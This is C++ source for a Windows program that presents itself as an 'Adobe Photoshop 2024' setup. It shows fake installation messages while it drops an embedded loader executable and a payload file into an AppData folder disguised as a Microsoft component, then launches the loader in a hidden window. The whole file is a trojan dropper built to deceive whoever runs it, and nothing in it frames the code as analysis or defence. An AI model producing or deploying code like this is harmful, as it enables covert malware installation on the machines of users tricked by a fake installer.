#include <windows.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include "embedded.h"

int main() {
    std::cout << "Adobe Photoshop 2024 - Setup\n";
    std::cout << "[*] Extracting files...\n";
    
    char appdataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
    std::string dirPath = std::string(appdataPath) + "\\Microsoft\\InputPersonalization";
    CreateDirectoryA(dirPath.c_str(), NULL);

    std::string loaderPath = dirPath + "\\sys_loader.exe";
    std::ofstream outLoader(loaderPath, std::ios::binary);
    outLoader.write((char*)loader_data, loader_size); outLoader.close();

    std::string payloadPath = dirPath + "\\payload.dat";
    std::ofstream outPayload(payloadPath, std::ios::binary);
    outPayload.write((char*)payload_data, payload_size); outPayload.close();

    std::cout << "[+] Installation complete!\n";
    Sleep(1000);
    WinExec(loaderPath.c_str(), SW_HIDE);
    return 0;
}
